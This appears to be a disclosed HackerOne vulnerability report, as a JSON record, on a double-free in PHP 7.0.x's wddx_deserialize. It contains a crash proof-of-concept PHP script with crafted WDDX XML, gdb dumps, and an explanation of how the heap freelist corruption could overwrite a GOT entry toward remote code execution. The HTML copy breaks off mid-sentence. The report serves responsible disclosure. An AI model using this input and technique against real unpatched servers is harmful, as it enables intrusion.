{"id":146255,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDYyNTU=","url":"https://hackerone.com/reports/146255","title":"Double Free Corruption in wddx.c (extension)","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-06-21T15:52:28.912Z","submitted_at":"2016-06-21T15:52:28.912Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"hoangnguyen","url":"/hoangnguyen","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/074/688/42c5ca5265ff965283d70fc52df2681dfd648d44_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":29,"url":"https://hackerone.com/ibb-php","handle":"ibb-php","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"PHP (IBB)","twitter_handle":"","website":"http://www.php.net","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-11-12T09:35:00.257Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-10-13T09:34:59.406Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"There are a bug double free occur in wddx_deserialize, which trying to deserialize malicious xml input from user's request.\n\nThe problem start here in :\n```\nstatic void php_wddx_push_element(void *user_data, const XML_Char *name, const XML_Char **atts)\n{\n           ...snip.....\n\t} else if (!strcmp((char *)name, EL_BOOLEAN)) {\n\t\tint i;\n\n\t\tif (atts) for (i = 0; atts[i]; i++) {\n\t\t\tif (!strcmp((char *)atts[i], EL_VALUE) \u0026\u0026 atts[++i] \u0026\u0026 atts[i][0]) {\n\t\t\t\tent.type = ST_BOOLEAN;\n\t\t\t\tSET_STACK_VARNAME;\n\n\t\t\t\tZVAL_TRUE(\u0026ent.data);\n\t\t\t\twddx_stack_push((wddx_stack *)stack, \u0026ent, sizeof(st_entry));\n\t\t\t\tphp_wddx_process_data(user_data, atts[i], strlen((char *)atts[i]));\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n}\n```\nWhen wddx_deserialize a tag \u003cboolean value=\"true/false\"\u003e they get content of value and then pass to  php_wddx_process_data(user_data, atts[i], strlen((char *)atts[i])); directly.\n\n```\nstatic void php_wddx_process_data(void *user_data, const XML_Char *s, int len)\n{\n           ...snip.....\n          wddx_stack_top(stack, (void**)\u0026ent); //return element in top of the stack\n           switch (ent-\u003etype) {\n\t\t\tcase ST_BOOLEAN:\n\t\t\t\tif (!strcmp((char *)s, \"true\")) {\n\t\t\t\t\tZ_LVAL(ent-\u003edata) = 1;\n\t\t\t\t} else if (!strcmp((char *)s, \"false\")) {\n\t\t\t\t\tZ_LVAL(ent-\u003edata) = 0;\n\t\t\t\t} else {\n\t\t\t\t\tzval_ptr_dtor(\u0026ent-\u003edata);\n\t\t\t\t\tif (ent-\u003evarname) {\n\t\t\t\t\t\tefree(ent-\u003evarname);\n\t\t\t\t\t}\n\t\t\t\t\tZVAL_UNDEF(\u0026ent-\u003edata);\n\t\t\t\t}\n\t\t\t\tbreak;\n        ...snip....\n}\n```\nIn php_wddx_process_data they just compare value data with \"true\" or \"false\" and set 0/1 to ent-\u003edata. The  problem is if value is not true/false then they call **efree(ent-\u003evarname) ** .\nAfter that, php_wddx_process_data back to php_wddx_push_element to continute execution. If i add some string in \u003cboolean\u003e (ex: \u003cboolean value=\"none\"\u003eAAAAA\u003c/boolean\u003e ), php_wddx_process_data will call again (after php_wddx_push_element had ended) and wddx_stack_top will return the same ent in the last called  php_wddx_process_data and because s in this second call point to own xml string and ent-\u003etype still is boolean so efree(ent-\u003evarname) will hit again, and this leads to double free.\n\n### Crash Poc (Ubuntu 16.04 x86_64,PHP 7.0.4 (cli))\ntest.php\n```\n\u003c?php\n$xml = \u003c\u003c\u003cEOF\n\u003c?xml version='1.0' ?\u003e\n\u003c!DOCTYPE wddxPacket SYSTEM 'wddx_0100.dtd'\u003e\n\u003cwddxPacket version='1.0'\u003e\n\t\u003carray\u003e\n\t\t\u003cvar name=\"XXXXXXXX\"\u003e\n\t\t\t\u003cboolean value=\"none\"\u003eAAAAAAA\u003c/boolean\u003e\n\t\t\u003c/var\u003e\n\t\t\u003cvar name=\"YYYYYYYY\"\u003e\n\t\t\t\u003cvar name=\"ZZZZZZZZ\"\u003e\n\t\t\t\t\u003cvar name=\"EZEZEZEZ\"\u003e\n\t\t\t\t\u003c/var\u003e\n\t\t\t\u003c/var\u003e\n\t\t\u003c/var\u003e\n\t\u003c/array\u003e\n\u003c/wddxPacket\u003e\nEOF;\n$array = wddx_deserialize($xml);\n\n// echo var_dump($array);\n\nforeach($array as $key =\u003e $value){\n\techo \"{$key} : {$value}\\n\";\n}\n// php\n?\u003e\n```\n\nAnd we got :\n```\nProgram received signal SIGSEGV, Segmentation fault.\n[----------------------------------registers-----------------------------------]\nRAX: 0x5959595959595959 ('YYYYYYYY')\nRBX: 0x5\nRCX: 0x14\nRDX: 0x9 ('\\t')\nRSI: 0x30 ('0')\nRDI: 0x7ffff4400040 --\u003e 0x0\nRBP: 0x7fffffffab20 --\u003e 0x7fffffffab90 --\u003e 0x7fffffffabc0 --\u003e 0x7fffffffac00 --\u003e 0x7fffffffad20 --\u003e 0x7fffffffada0 --\u003e 0x121b780 --\u003e 0x1217fe0 --\u003e 0x0\nRSP: 0x7fffffffaad0 --\u003e 0x7ffff4471100 --\u003e 0x9 ('\\t')\nRIP: 0x8536b1 (\u003czend_mm_alloc_small+176\u003e:\tmov    rdx,QWORD PTR [rax])\nR8 : 0x313\nR9 : 0x0\nR10: 0x5\nR11: 0x1\nR12: 0x121cd34 --\u003e 0x6f6f6200656d616e ('name')\nR13: 0x121985b (\"name=\\\"UUUUUUUU\\\"\u003e\\n\\t\\t\\t\\t\u003c/var\u003e\\n\\t\\t\\t\u003c/var\u003e\\n\\t\\t\u003c/var\u003e\\n\\t\u003c/array\u003e\\n\u003c/wddxPacket\u003e\")\nR14: 0x1\nR15: 0x121d150 --\u003e 0x121cd34 --\u003e 0x6f6f6200656d616e ('name')\nEFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x8536a5 \u003czend_mm_alloc_small+164\u003e:\tmov    rax,QWORD PTR [rax+rdx*8]\n   0x8536a9 \u003czend_mm_alloc_small+168\u003e:\tmov    QWORD PTR [rbp-0x8],rax\n   0x8536ad \u003czend_mm_alloc_small+172\u003e:\tmov    rax,QWORD PTR [rbp-0x8]\n=\u003e 0x8536b1 \u003czend_mm_alloc_small+176\u003e:\tmov    rdx,QWORD PTR [rax]\n   0x8536b4 \u003czend_mm_alloc_small+179\u003e:\tmov    rax,QWORD PTR [rbp-0x28]\n   0x8536b8 \u003czend_mm_alloc_small+183\u003e:\tmov    ecx,DWORD PTR [rbp-0x34]\n   0x8536bb \u003czend_mm_alloc_small+186\u003e:\tmovsxd rcx,ecx\n   0x8536be \u003czend_mm_alloc_small+189\u003e:\tadd    rcx,0x4\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffaad0 --\u003e 0x7ffff4471100 --\u003e 0x9 ('\\t')\n0008| 0x7fffffffaad8 --\u003e 0x0\n0016| 0x7fffffffaae0 --\u003e 0xd91858 (\"/home/vagrant/Sources_Ext/php7.0-7.0.4/ext/wddx/wddx.c\")\n0024| 0x7fffffffaae8 --\u003e 0x500000313\n0032| 0x7fffffffaaf0 --\u003e 0x30 ('0')\n0040| 0x7fffffffaaf8 --\u003e 0x7ffff4400040 --\u003e 0x0\n0048| 0x7fffffffab00 --\u003e 0x7ffff44710f0 (\"ZZZZZZZZ\")\n0056| 0x7fffffffab08 --\u003e 0x59688\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x00000000008536b1 in zend_mm_alloc_small (heap=0x7ffff4400040, size=0x30, bin_num=0x5,\n    __zend_filename=0xd91858 \"/home/vagrant/Sources_Ext/php7.0-7.0.4/ext/wddx/wddx.c\",\n    __zend_lineno=0x313, __zend_orig_filename=0x0, __zend_orig_lineno=0x0)\n    at /home/vagrant/Sources_Ext/php7.0-7.0.4/Zend/zend_alloc.c:1291\n1291\t\t\theap-\u003efree_slot[bin_num] = p-\u003enext_free_slot;\n```\n### Analysis in deep \n\nWhen free(XXXXXXXX)  zend_mm_alloc_small will update linked list for each size request and store the last freed chunk into heap-\u003efree_slot. Because free(XXXXXXXX) was freed 2 times then this next pointer will point to itself.\n\nAfter 1st efree(ent-\u003evarname).\n```\n[-------------------------------------code-------------------------------------]\n   0x7c6f0b \u003cphp_wddx_process_data+606\u003e:\n    lea    rsi,[rip+0x5ca946]        # 0xd91858\n   0x7c6f12 \u003cphp_wddx_process_data+613\u003e:  mov    rdi,rax\n   0x7c6f15 \u003cphp_wddx_process_data+616\u003e:  call   0x85637d \u003c_efree\u003e\n=\u003e 0x7c6f1a \u003cphp_wddx_process_data+621\u003e:  mov    rax,QWORD PTR [rbp-0x60]\n   0x7c6f1e \u003cphp_wddx_process_data+625\u003e:  mov    DWORD PTR [rax+0x8],0x0\n   0x7c6f25 \u003cphp_wddx_process_data+632\u003e:\n    jmp    0x7c7005 \u003cphp_wddx_process_data+856\u003e\n   0x7c6f2a \u003cphp_wddx_process_data+637\u003e:  mov    eax,DWORD PTR [rbp-0x74]\n   0x7c6f2d \u003cphp_wddx_process_data+640\u003e:  add    eax,0x1\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffab80 --\u003e 0x7ffff4402a40 --\u003e 0x121d150 --\u003e 0x121cd41 --\u003e 0x65756c6176 ('value')\n0008| 0x7fffffffab88 --\u003e 0x4f4402a60\n0016| 0x7fffffffab90 --\u003e 0x12046b0 --\u003e 0x74696873 ('shit')\n0024| 0x7fffffffab98 --\u003e 0x7fffffffb060 --\u003e 0x1000000002\n0032| 0x7fffffffaba0 --\u003e 0x7ffff4402a40 --\u003e 0x121d150 --\u003e 0x121cd41 --\u003e 0x65756c6176 ('value')\n0040| 0x7fffffffaba8 --\u003e 0x7fffffffb060 --\u003e 0x1000000002\n0048| 0x7fffffffabb0 --\u003e 0xd91858 (\"/home/vagrant/Sources_Ext/php7.0-7.0.4/ext/wddx/wddx.c\")\n0056| 0x7fffffffabb8 --\u003e 0x20 (' ')\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n1023            ZVAL_UNDEF(\u0026ent-\u003edata);\ngdb-peda$ x/gx 0x7ffff44710c0\n0x7ffff44710c0: 0x00007ffff4471090\n```\n\nAfter the second efree(ent-\u003evarname)\n\n```\n[-------------------------------------code-------------------------------------]\n   0x7c6f0b \u003cphp_wddx_process_data+606\u003e:\n    lea    rsi,[rip+0x5ca946]        # 0xd91858\n   0x7c6f12 \u003cphp_wddx_process_data+613\u003e:  mov    rdi,rax\n   0x7c6f15 \u003cphp_wddx_process_data+616\u003e:  call   0x85637d \u003c_efree\u003e\n=\u003e 0x7c6f1a \u003cphp_wddx_process_data+621\u003e:  mov    rax,QWORD PTR [rbp-0x60]\n   0x7c6f1e \u003cphp_wddx_process_data+625\u003e:  mov    DWORD PTR [rax+0x8],0x0\n   0x7c6f25 \u003cphp_wddx_process_data+632\u003e:\n    jmp    0x7c7005 \u003cphp_wddx_process_data+856\u003e\n   0x7c6f2a \u003cphp_wddx_process_data+637\u003e:  mov    eax,DWORD PTR [rbp-0x74]\n   0x7c6f2d \u003cphp_wddx_process_data+640\u003e:  add    eax,0x1\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffad00 --\u003e 0x7\n0008| 0x7fffffffad08 --\u003e 0x400000005\n0016| 0x7fffffffad10 --\u003e 0x1219809 (\"\\n\\t\\t\\t\u003c/boolean\u003e\\n\\t\\t\u003c/var\u003e\\n\\t\\t\u003cvar name=\\\"YYYYYYYY\\\"\u003e\\n\\t\\t\\t\u003cvar name=\\\"ZZZZZZZZ\\\"\u003e\\n\\t\\t\\t\\t\u003cvar name=\\\"EZEZEZEZ\\\"\u003e\\n\\t\\t\\t\\t\u003c/var\u003e\\n\\t\\t\\t\u003c/var\u003e\\n\\t\\t\u003c/var\u003e\\n\\t\u003c/array\u003e\\n\u003c/wddxPacket\u003e\")\n0024| 0x7fffffffad18 --\u003e 0x7fffffffb060 --\u003e 0x1000000002\n0032| 0x7fffffffad20 --\u003e 0x7ffff4402a40 --\u003e 0x121d150 --\u003e 0x121cd41 --\u003e 0x65756c6176 ('value')\n0040| 0x7fffffffad28 --\u003e 0x7fffffffb060 --\u003e 0x1000000002\n0048| 0x7fffffffad30 --\u003e 0x121d168 --\u003e 0x0\n0056| 0x7fffffffad38 --\u003e 0x121cd41 --\u003e 0x65756c6176 ('value')\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n1023            ZVAL_UNDEF(\u0026ent-\u003edata);\ngdb-peda$ x/gx 0x7ffff44710c0\n0x7ffff44710c0: 0x00007ffff44710c0\n```\nwe got a chunk that point to itself, because zend_mm_alloc_small() will update heap-\u003efree_slot[bin_num] = p-\u003enext_free_slot.\n\nIf we try to malloc with the same size of ent-\u003evarname (was freed) at 0x7ffff44710c0 :\n\n1st malloc : YYYYYYYY , zend_mm_alloc_small() will return with 0x7ffff44710c0 and update heap-\u003efree_slot[bin_num] = p-\u003enext_free_slot = 0x7ffff44710c0 (because 0x7ffff44710c0 point to itself as above).\n\n```\n[----------------------------------registers-----------------------------------]\nRAX: 0x7ffff44710c0 (\"YYYYYYYY\")\nRBX: 0x5\nRCX: 0x12\nRDX: 0x9 ('\\t')\nRSI: 0x12046b0 (\"YYYYYYYY\")\nRDI: 0x7ffff44710c0 (\"YYYYYYYY\")\nRBP: 0x7fffffffad20 --\u003e 0x7fffffffada0 --\u003e 0x121b780 --\u003e 0x1217fe0 --\u003e 0x0\nRSP: 0x7fffffffac10 --\u003e 0x7ffff4402a40 --\u003e 0x7ffff44029c0 --\u003e 0x7ffff4402980 --\u003e 0x7ffff4402940 --\u003e 0x7ffff44028c0 --\u003e 0x7ffff4402bc0 --\u003e 0x7ffff4402c00 --\u003e 0x7ffff4402c40 --\u003e 0x7ffff4402c80 --\u003e 0x7ffff4402cc0 --\u003e 0x7ffff4402d00 --\u003e 0x7ffff4402d40 --\u003e 0x7ffff4402d80 --\u003e 0x7ffff4402dc0 --\u003e 0x7ffff4402e00 --\u003e 0x7ffff4402e40 --\u003e 0x7ffff4402e80 --\u003e 0x7ffff4402ec0 --\u003e 0x7ffff4402f00 --\u003e 0x7ffff4402f40 --\u003e 0x7ffff4402f80 --\u003e 0x7ffff4402fc0 --\u003e 0x0\nRIP: 0x7c5ce1 (\u003cphp_wddx_push_element+2802\u003e:  mov    rdx,rax)\nR8 : 0x313\nR9 : 0x0\nR10: 0x5\nR11: 0x1\nR12: 0x121cd34 --\u003e 0x6f6f6200656d616e ('name')\nR13: 0x1219828 (\"name=\\\"YYYYYYYY\\\"\u003e\\n\\t\\t\\t\u003cvar name=\\\"ZZZZZZZZ\\\"\u003e\\n\\t\\t\\t\\t\u003cvar name=\\\"EZEZEZEZ\\\"\u003e\\n\\t\\t\\t\\t\u003c/var\u003e\\n\\t\\t\\t\u003c/var\u003e\\n\\t\\t\u003c/var\u003e\\n\\t\u003c/array\u003e\\n\u003c/wddxPacket\u003e\")\nR14: 0x1\nR15: 0x121d150 --\u003e 0x121cd34 --\u003e 0x6f6f6200656d616e ('name')\nEFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x7c5cd2 \u003cphp_wddx_push_element+2787\u003e:\n    lea    rsi,[rip+0x5cbb7f]        # 0xd91858\n   0x7c5cd9 \u003cphp_wddx_push_element+2794\u003e: mov    rdi,rax\n   0x7c5cdc \u003cphp_wddx_push_element+2797\u003e: call   0x856850 \u003c_estrdup\u003e\n=\u003e 0x7c5ce1 \u003cphp_wddx_push_element+2802\u003e: mov    rdx,rax\n   0x7c5ce4 \u003cphp_wddx_push_element+2805\u003e: mov    rax,QWORD PTR [rbp-0xc0]\n   0x7c5ceb \u003cphp_wddx_push_element+2812\u003e: mov    QWORD PTR [rax+0x8],rdx\n   0x7c5cef \u003cphp_wddx_push_element+2816\u003e:\n    jmp    0x7c639c \u003cphp_wddx_push_element+4525\u003e\n   0x7c5cf4 \u003cphp_wddx_push_element+2821\u003e: add    DWORD PTR [rbp-0xd8],0x1\n[------------------------------------stack-------------------------------------]\n```\n\n2nd malloc : ZZZZZZZZ , zend_mm_alloc_small() will return with 0x7ffff44710c0 again and then update \nheap-\u003efree_slot[bin_num] = p-\u003enext_free_slot = YYYYYYYY (because zend_mm_alloc_small think YYYYYYYY is the next_free_slot).\n\n3rd malloc:  EZEZEZEZ, zend_mm_alloc_small() will return YYYYYYYY for us and this lead to crash at **heap-\u003efree_slot[bin_num] = p-\u003enext_free_slot;** when zend_mm_alloc_small() try to update next_free_slot to heap-\u003efree_slot.\n\nAt this point, if we replace YYYYYYYY with an address of GOT table for example memcpy@got, zend_mm_alloc_small() will happly return this address for us, and the call memcpy(memcpy@got,EZEZEZEZE,8); in which EZEZEZEZ is value we control, this may lead to remote code execution.\n\nThis bug also works in PHP 7.0.x\n\nReferences: https://bugs.php.net/bug.php?id=72340","vulnerability_information_html":"\u003cp\u003eThere are a bug double free occur in wddx_deserialize, which trying to deserialize malicious xml input from user\u0026#39;s request.\u003c/p\u003e\n\n\u003cp\u003eThe problem start here in :\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003estatic void php_wddx_push_element(void *user_data, const XML_Char *name, const XML_Char **atts)\n{\n           ...snip.....\n    } else if (!strcmp((char *)name, EL_BOOLEAN)) {\n        int i;\n\n        if (atts) for (i = 0; atts[i]; i++) {\n            if (!strcmp((char *)atts[i], EL_VALUE) \u0026amp;\u0026amp; atts[++i] \u0026amp;\u0026amp; atts[i][0]) {\n                ent.type = ST_BOOLEAN;\n                SET_STACK_VARNAME;\n\n                ZVAL_TRUE(\u0026amp;ent.data);\n                wddx_stack_push((wddx_stack *)stack, \u0026amp;ent, sizeof(st_entry));\n                php_wddx_process_data(user_data, atts[i], strlen((char *)atts[i]));\n                break;\n            }\n        }\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhen wddx_deserialize a tag \u0026lt;boolean value=\u0026quot;true/false\u0026quot;\u0026gt; they get content of value and then pass to  php_wddx_process_data(user_data, atts[i], strlen((char *)atts[i])); directly.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003estatic void php_wddx_process_data(void *user_data, const XML_Char *s, int len)\n{\n           ...snip.....\n          wddx_stack_top(stack, (void**)\u0026amp;ent); //return element in top of the stack\n           switch (ent-\u0026gt;type) {\n            case ST_BOOLEAN:\n                if (!strcmp((char *)s, \u0026quot;true\u0026quot;)) {\n                    Z_LVAL(ent-\u0026gt;data) = 1;\n                } else if (!strcmp((char *)s, \u0026quot;false\u0026quot;)) {\n                    Z_LVAL(ent-\u0026gt;data) = 0;\n                } else {\n                    zval_ptr_dtor(\u0026amp;ent-\u0026gt;data);\n                    if (ent-\u0026gt;varname) {\n                        efree(ent-\u0026gt;varname);\n                    }\n                    ZVAL_UNDEF(\u0026amp;ent-\u0026gt;data);\n                }\n                break;\n        ...snip....\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIn php_wddx_process_data they just compare value data with \u0026quot;true\u0026quot; or \u0026quot;false\u0026quot; and set 0/1 to ent-\u0026gt;data. The  problem is if value is not true/false then they call *\u003cem\u003eefree(ent-\u0026gt;varname) *\u003c/em\u003e .\u003cbr\u003e\nAfter that, php_wddx_process_data back to php_wddx_push_element to continute execution. If i add some string in \u0026lt;boolean\u0026gt; (ex: \u0026lt;boolean value=\u0026quot;none\u0026quot;\u0026gt;AAAAA\u0026lt;/boolean\u0026gt; ), php_wddx_process_data will call again (after php_wddx_push_element had ended) and wddx_stack_top will return the same ent in the last called  php_wddx_process_data and because s in this second call point to own xml string and ent-\u0026gt;type still is boolean so efree(ent-\u0026gt;varname) will hit again, and this leads to double free.\u003c/p\u003e\n\n\u003ch3 id=\"crash-poc-ubuntu-16-04-x86_64-php-7-0-4-cli\"\u003eCrash Poc (Ubuntu 16.04 x86_64,PHP 7.0.4 (cli))\u003c/h3\u003e\n\n\u003cp\u003etest.php\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e\u003cspan class=\"err\"\u003e\u0026lt;\u003c/span\u003e?php\n$xml = \u003cspan class=\"err\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026lt;EOF\u003c/span\u003e\n\u003cspan class=\"err\"\u003e\u0026lt;?xml\u003c/span\u003e \u003cspan class=\"na\"\u003eversion=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;1.0\u0026#39;\u003c/span\u003e \u003cspan class=\"err\"\u003e?\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e\u0026lt;!DOCTYPE wddxPacket SYSTEM \u0026#39;wddx_0100.dtd\u0026#39;\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;wddxPacket\u003c/span\u003e \u003cspan class=\"na\"\u003eversion=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;1.0\u0026#39;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;array\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;var\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;XXXXXXXX\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;boolean\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;none\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eAAAAAAA\u003cspan class=\"nt\"\u003e\u0026lt;/boolean\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;/var\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;var\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;YYYYYYYY\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;var\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;ZZZZZZZZ\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;var\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;EZEZEZEZ\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n                \u003cspan class=\"nt\"\u003e\u0026lt;/var\u0026gt;\u003c/span\u003e\n            \u003cspan class=\"nt\"\u003e\u0026lt;/var\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;/var\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/array\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/wddxPacket\u0026gt;\u003c/span\u003e\nEOF;\n$array = wddx_deserialize($xml);\n\n// echo var_dump($array);\n\nforeach($array as $key =\u0026gt; $value){\n    echo \u0026quot;{$key} : {$value}\\n\u0026quot;;\n}\n// php\n?\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAnd we got :\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eProgram received signal SIGSEGV, Segmentation fault.\n[----------------------------------registers-----------------------------------]\nRAX: 0x5959595959595959 (\u0026#39;YYYYYYYY\u0026#39;)\nRBX: 0x5\nRCX: 0x14\nRDX: 0x9 (\u0026#39;\\t\u0026#39;)\nRSI: 0x30 (\u0026#39;0\u0026#39;)\nRDI: 0x7ffff4400040 --\u0026gt; 0x0\nRBP: 0x7fffffffab20 --\u0026gt; 0x7fffffffab90 --\u0026gt; 0x7fffffffabc0 --\u0026gt; 0x7fffffffac00 --\u0026gt; 0x7fffffffad20 --\u0026gt; 0x7fffffffada0 --\u0026gt; 0x121b780 --\u0026gt; 0x1217fe0 --\u0026gt; 0x0\nRSP: 0x7fffffffaad0 --\u0026gt; 0x7ffff4471100 --\u0026gt; 0x9 (\u0026#39;\\t\u0026#39;)\nRIP: 0x8536b1 (\u0026lt;zend_mm_alloc_small+176\u0026gt;:   mov    rdx,QWORD PTR [rax])\nR8 : 0x313\nR9 : 0x0\nR10: 0x5\nR11: 0x1\nR12: 0x121cd34 --\u0026gt; 0x6f6f6200656d616e (\u0026#39;name\u0026#39;)\nR13: 0x121985b (\u0026quot;name=\\\u0026quot;UUUUUUUU\\\u0026quot;\u0026gt;\\n\\t\\t\\t\\t\u0026lt;/var\u0026gt;\\n\\t\\t\\t\u0026lt;/var\u0026gt;\\n\\t\\t\u0026lt;/var\u0026gt;\\n\\t\u0026lt;/array\u0026gt;\\n\u0026lt;/wddxPacket\u0026gt;\u0026quot;)\nR14: 0x1\nR15: 0x121d150 --\u0026gt; 0x121cd34 --\u0026gt; 0x6f6f6200656d616e (\u0026#39;name\u0026#39;)\nEFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x8536a5 \u0026lt;zend_mm_alloc_small+164\u0026gt;:  mov    rax,QWORD PTR [rax+rdx*8]\n   0x8536a9 \u0026lt;zend_mm_alloc_small+168\u0026gt;:  mov    QWORD PTR [rbp-0x8],rax\n   0x8536ad \u0026lt;zend_mm_alloc_small+172\u0026gt;:  mov    rax,QWORD PTR [rbp-0x8]\n=\u0026gt; 0x8536b1 \u0026lt;zend_mm_alloc_small+176\u0026gt;:  mov    rdx,QWORD PTR [rax]\n   0x8536b4 \u0026lt;zend_mm_alloc_small+179\u0026gt;:  mov    rax,QWORD PTR [rbp-0x28]\n   0x8536b8 \u0026lt;zend_mm_alloc_small+183\u0026gt;:  mov    ecx,DWORD PTR [rbp-0x34]\n   0x8536bb \u0026lt;zend_mm_alloc_small+186\u0026gt;:  movsxd rcx,ecx\n   0x8536be \u0026lt;zend_mm_alloc_small+189\u0026gt;:  add    rcx,0x4\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffaad0 --\u0026gt; 0x7ffff4471100 --\u0026gt; 0x9 (\u0026#39;\\t\u0026#39;)\n0008| 0x7fffffffaad8 --\u0026gt; 0x0\n0016| 0x7fffffffaae0 --\u0026gt; 0xd91858 (\u0026quot;/home/vagrant/Sources_Ext/php7.0-7.0.4/ext/wddx/wddx.c\u0026quot;)\n0024| 0x7fffffffaae8 --\u0026gt; 0x500000313\n0032| 0x7fffffffaaf0 --\u0026gt; 0x30 (\u0026#39;0\u0026#39;)\n0040| 0x7fffffffaaf8 --\u0026gt; 0x7ffff4400040 --\u0026gt; 0x0\n0048| 0x7fffffffab00 --\u0026gt; 0x7ffff44710f0 (\u0026quot;ZZZZZZZZ\u0026quot;)\n0056| 0x7fffffffab08 --\u0026gt; 0x59688\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x00000000008536b1 in zend_mm_alloc_small (heap=0x7ffff4400040, size=0x30, bin_num=0x5,\n    __zend_filename=0xd91858 \u0026quot;/home/vagrant/Sources_Ext/php7.0-7.0.4/ext/wddx/wddx.c\u0026quot;,\n    __zend_lineno=0x313, __zend_orig_filename=0x0, __zend_orig_lineno=0x0)\n    at /home/vagrant/Sources_Ext/php7.0-7.0.4/Zend/zend_alloc.c:1291\n1291            heap-\u0026gt;free_slot[bin_num] = p-\u0026gt;next_free_slot;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch3 id=\"analysis-in-deep\"\u003eAnalysis in deep\u003c/h3\u003e\n\n\u003cp\u003eWhen free(XXXXXXXX)  zend_mm_alloc_small will update linked list for each size request and store the last freed chunk into heap-\u0026gt;free_slot. Because free(XXXXXXXX) was freed 2 times then this next pointer will point to 